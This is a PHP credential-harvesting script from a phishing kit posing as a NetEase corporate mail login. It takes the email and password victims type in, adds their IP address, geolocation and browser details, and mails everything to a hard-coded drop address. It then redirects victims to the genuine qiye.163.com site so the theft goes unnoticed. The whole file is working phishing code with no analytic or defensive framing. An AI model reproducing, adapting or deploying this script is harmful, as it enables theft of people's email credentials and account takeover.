<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$username = $_POST['email'];
$passwd = $_POST['password'];
$own = 'richdan07@zohomail.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$domain = 'NetEase';
$sender = 'KinqLoqz';
$subj = "$domain Login";
$headers .= "From: KinqLoqz<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'verified.php';
$domain = substr(strrchr($user, "@"), 1);
$msg = "<HTML><BODY>
<TABLE>
<tr><td>********New Login********</td></tr>
<tr><td>Email: $username <td/></tr>
<tr><td>PassWord: $passwd </td></tr>
<tr><td>IP: $country <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
<tr><td>User Agent: $browser <td/></tr>
<tr><td>URL: http://$web$inj <td/></tr>
</BODY>
</HTML>";
if (empty($username) || empty($passwd)) {
header( "Location: http://$web$inj" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: https://qiye.163.com");
}

function visitor_country()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryName != null)
{
$result = $ip_data->geoplugin_countryName;
}

return $result;
}
function visitor_countryCode()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryCode != null)
{
$result = $ip_data->geoplugin_countryCode;
}

return $result;
}
function visitor_regionName()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_regionName != null)
{
$result = $ip_data->geoplugin_regionName;
}

return $result;
}
function visitor_continentCode()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_continentCode != null)
{
$result = $ip_data->geoplugin_continentCode;
}

return $result;
}
?>
